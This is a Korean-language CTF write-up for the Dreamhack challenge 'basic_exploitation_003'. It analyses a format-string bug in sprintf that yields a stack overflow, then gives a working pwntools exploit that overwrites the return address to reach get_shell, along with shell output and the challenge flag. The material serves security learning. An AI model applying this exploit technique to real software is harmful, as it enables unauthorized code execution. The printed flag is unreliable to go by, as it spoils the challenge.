# Dreamhack: basic_exploitation_003 Write-up

## 1. Problem Overview
- **Category:** Pwnable
- **Difficulty:** Level 1
- **Tool:** IDA Free, VS Code (Python), Pwndbg
- **Description:** 포맷스트링 취약점을 활용해 버퍼오버플로우를 유도하는 문제

## 2. Static Analysis (정적 분석)

**sprintf(s, buf)**

- buf: 사용자로부터 read() 함수를 통해 입력받는 값 (최대 0x80 = 128바이트)
- s: malloc(0x80)으로 할당된 스택에 선언된 0x98(152바이트) 크기의 배열.

사용자가 buf에 %156c라고 입력하면 sprintf는 1바이트만 읽지만 s에는 156바이트의 공백을 써넣습니다.
결국 입력 데이터의 크기보다 출력 데이터의 크기가 훨씬 커지면서 스택 오버플로우를 발생시킬 수 있습니다.
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[144]; // [esp+0h] [ebp-98h] BYREF
  void *buf; // [esp+90h] [ebp-8h]

  buf = malloc(0x80u);
  memset(s, 0, sizeof(s));
  initialize();
  read(0, buf, 0x80u);
  sprintf(s, (const char *)buf);
  printf("ECHO : %s\n", s);
  return 0;
}
```

프로그램 내에 shell에 접속하게 하는 함수(get_shell)의 주소를 pwndbg에서 추출했습니다.
```bash
pwndbg> info address get_shell
Symbol "get_shell" is at 0x8048669 in a file compiled without debugging.
```

main합수의 Stack Frame입니다.
```assembly
-0000000000000098     char s;
// pading byte
-0000000000000008     void *buf;
-0000000000000004     _DWORD var_4;
+0000000000000000     _DWORD __saved_registers;
+0000000000000004     _UNKNOWN *__return_address;
+0000000000000008     int argc;
+000000000000000C     const char **argv;
+0000000000000010     const char **envp;
```
- s의 크기가 0x98 (152바이트)
- 32비트 환경이므로 스택 구조는 [buf] (152) + [SFP] (4) + [RET] (4) 순으로 구성됨.

## 3. Solution & Dynamic Analysis (동적 분석)

### Dynamic Analysis
- 보호 기법 확인 (checksec)
본격적인 공격에 앞서 바이너리에 적용된 보안 메커니즘을 확인합니다.

```bash
dreamhack@dongyeon:/mnt/f/dreamhack$ checksec --file=./basic_exploitation_003
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable   FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   83 Symbols        No    0               3             ./basic_exploitation_003
```

데이터 입력 시 스택의 무결성을 검증하는 카나리 값이 없으므로 버퍼를 넘쳐 리턴 어드레스(RET)를 직접 수정하는 Stack Buffer Overflow 공격이 가능합니다.

또한 PIE가 비활성화되어 있어 IDA에서 확인한 함수의 절대 주소를 그대로 사용할 수 있습니다.

- 스택 오버라이트 확인 (pwndbg)
작성한 페이로드가 실제 메모리에 의도한 대로 들어갔는지 gdb를 통해 검증합니다. ret에 중단점을 설정하고 실행한 결과입니다.
input: **run < payload**

```bash
pwndbg> tele $esp 20
00:0000│ esp 0xffffce3c —▸ 0x8048669 (get_shell) ◂— push ebp
01:0004│     0xffffce40 ◂— 0
```
tele $esp 20 명령어로 확인한 결과 RET 영역이 목표 주소인 0x8048669(get_shell)로 정확히 덮였으며, 이로 인해 ret 명령어 실행 시 EIP가 조작되어 프로그램이 플래그 출력 루틴으로 강제 점프하게 됩니다.

### Full Solver Code
```python
from pwn import *

# 설정 및 연결
context.arch = 'i386'
p = remote('host3.dreamhack.games', 19829)

# 공격 데이터 생성
target_address = 0x8048669 # get_shell 주소

# %156c: sprintf를 통해 156바이트를 생성하여 RET 앞까지 채움 (포맷 스트링 공격)
# p32: 리턴 주소(RET)를 get_shell 주소로 덮음
payload = b'%156c' + p32(target_address)

# 로컬 분석용 파일 저장 (gdb < payload 실행용)
with open("payload", "wb") as f:
    f.write(payload)

# 전송 및 셸 획득
p.sendline(payload)
p.interactive()
```

## 4. Results
```bash
dreamhack@dongyeon:/mnt/f/dreamhack$ python3 t.py 
[+] Opening connection to host3.dreamhack.games on port 19829: Done
b'%156ci\x86\x04\x08'
[*] Switching to interactive mode
ECHO :                                                                                                                                                             i\x86\x0
$ ls
basic_exploitation_003
flag
$ cat flag
DH{4e6e355c62249b2da3b566f0d575007e}$  
```

## 5. Thoughts
basic_exploitation_001과는 다르게 sprintf의 포맷스트링 취약점을 모르니까 
막 힙영역에서 어떻게 스택영역까지 침범할 수 있을까 고민하다가
sprintf는 원래 포맷스트링을 지정해줘야한다는것을 깨닫고 이 문제의 sprintf가 취약하다는점을 활용해 
스택오버플로우를 발생시킬 수 있었다.













